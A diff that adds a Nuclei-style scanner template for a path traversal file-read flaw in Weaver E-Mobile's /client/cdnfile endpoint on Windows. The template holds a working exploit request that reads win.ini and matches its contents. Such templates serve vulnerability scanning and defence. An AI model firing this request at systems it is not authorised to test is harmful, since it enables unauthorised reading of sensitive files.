@@ -1,0 +1,25 @@
+id: weaver-e-mobile-cdnfile-lfi-windows
+
+info:
+  name: "泛微E-Mobile cdnfile接口路径遍历导致任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    泛微E-Mobile移动办公平台由上海泛微网络科技股份有限公司开发，为移动终端提供办公功能。该系统在/client/cdnfile接口存在路径遍历与访问控制缺陷，攻击者可通过构造特定请求路径，绕过访问控制机制，读取目标系统中的敏感文件内容，导致机密信息泄露。该漏洞影响Windows平台部署的实例。
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    GET /client/cdnfile/1C/Windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
